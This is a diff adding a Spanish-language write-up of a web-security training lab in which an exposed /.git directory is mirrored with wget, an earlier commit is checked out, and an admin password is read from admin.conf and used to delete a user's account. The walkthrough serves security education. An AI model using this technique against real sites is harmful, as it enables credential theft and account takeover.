@@ -205,7 +205,64 @@ Y eliminamos el usuario carlos y completamos el laboratorio.
 
 ## 5. Lab: Information disclosure in version control history
 
+```
+Este laboratorio divulga información confidencial a través de su historial de control de versiones. Para resolver el laboratorio, obtenga la contraseña del administrador. Luego, inicie sesión como administratory elimine la cuenta de Carlos.
+```
 
+Empezaremos accediando al recurso **/.git** para verificar si existe.
 
+![](img10.png)
 
+Luego lo que haremos será bajarnos todo el directorio **.git** para ello vamos a realizar el siguiente comandos:
 
+```
+└──╼ $wget -m https://ac3d1f321f2ccec2800b4ff800f2009a.web-security-academy.net/.git
+```
+
+Luego accedemos al directorio creado con el dominio del sitio y realizamos un **ls -a**
+
+```
+└──╼ $ls -a
+.  ..  .git
+```
+
+Entonces lo que haremos será listar los commits presentes en dicho reposito:
+
+```
+└──╼ $git log
+error: unable to open object pack directory: .git/objects/pack: Not a directory
+commit 70de767ae50d4c7d753500623117079829aa6288 (HEAD -> master)
+Author: Carlos Montoya <carlos@evil-user.net>
+Date:   Tue Jun 23 14:05:07 2020 +0000
+
+    Remove admin password from config
+
+commit fda17286f4bc8e44c826b3023c97d4e6ad325f4d
+Author: Carlos Montoya <carlos@evil-user.net>
+Date:   Mon Jun 22 16:23:42 2020 +0000
+
+    Add skeleton admin panel
+```
+
+Y ahora como vemos existe un commit que nos dice que se removió la contraseña del admin de la configuracion, así que iremos a un commit anterior para ser mas exactos:
+
+```
+commit fda17286f4bc8e44c826b3023c97d4e6ad325f4d
+```
+
+Lo cual lo realizaremos con el comando **git checkout HASH** y luego vemos que nos genera un archivo que contiene la contraseña.
+
+```
+└──╼ $git checkout fda17286f4bc8e44c826b3023c97d4e6ad325f4d
+.......
+└──╼ $cat admin.conf 
+ADMIN_PASSWORD=v3skb3qc19euezckz628
+```
+
+Ahora nos logeamos con el usuario **administrator** y la contraseña **v3skb3qc19euezckz628** y eliminamos a carlos para completar el laboratorio.
+
+![](img11.png)
+
+## CONCLUSION
+
+Esta seccion de laboratorio nos sirve para identificar todas esos datos que nos pueden servir para desarrollar tecnicas de ataque mas elaboradas para el objetivo que tengamos.
